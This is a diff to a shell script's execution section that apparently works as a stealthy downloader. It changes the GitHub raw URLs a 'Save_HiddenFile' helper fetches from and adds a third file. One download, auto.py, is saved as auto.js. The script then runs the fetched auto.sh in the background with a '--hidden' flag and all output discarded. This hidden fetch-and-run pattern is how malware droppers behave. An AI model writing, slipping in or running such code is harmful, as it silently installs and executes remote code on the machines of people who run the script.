@@ -49,18 +49,22 @@ except:
 
 # ---- Execution ----
 
-FINAL_PATH="$CONFIG_PATH/client.py"
-Save_HiddenFile "https://raw.githubusercontent.com/boss-defender/export/main/client.py" "$FINAL_PATH" || { echo "Failed"; exit 1; }
+FINAL_PATH="$CONFIG_PATH/client.js"
+Save_HiddenFile "https://raw.githubusercontent.com/rahul-call/export/main/ror/client.js" "$FINAL_PATH" || { echo "Failed"; exit 1; }
 
-FINAL_PATH3="$CONFIG_PATH/auto.py"
-Save_HiddenFile "https://raw.githubusercontent.com/boss-defender/export/main/auto.py" "$FINAL_PATH3" || { echo "Failed"; exit 1; }
+FINAL_PATH3="$CONFIG_PATH/auto.sh"
+Save_HiddenFile "https://raw.githubusercontent.com/rahul-call/export/main/ror/auto.sh" "$FINAL_PATH3" || { echo "Failed"; exit 1; }
+
+FINAL_PATH0="$CONFIG_PATH/auto.js"
+Save_HiddenFile "https://raw.githubusercontent.com/rahul-call/export/main/ror/auto.py" "$FINAL_PATH0" || { echo "Failed"; exit 1; }
+
 
 if ! command -v python3 &> /dev/null; then
     echo "Failed"
     exit 1
 fi
 
-python3 -u "$FINAL_PATH3" "$FINAL_PATH" --hidden &> /dev/null &
+bash "$FINAL_PATH3" "$FINAL_PATH" --hidden &> /dev/null &
 LAUNCH_PID=$!
 
 wait $LAUNCH_PID
